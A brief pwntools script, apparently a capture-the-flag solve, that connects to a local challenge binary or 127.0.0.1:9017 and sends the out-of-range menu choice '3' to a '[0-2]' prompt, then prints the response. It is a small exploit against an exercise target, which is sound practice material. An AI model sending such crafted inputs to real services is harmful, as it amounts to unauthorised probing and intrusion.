#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

io = process("./main") if args.LOCAL else remote("127.0.0.1", 9017)
io.sendlineafter(b"[0-2]: ", b"3")
print(io.recvall().decode().strip())
io.close()
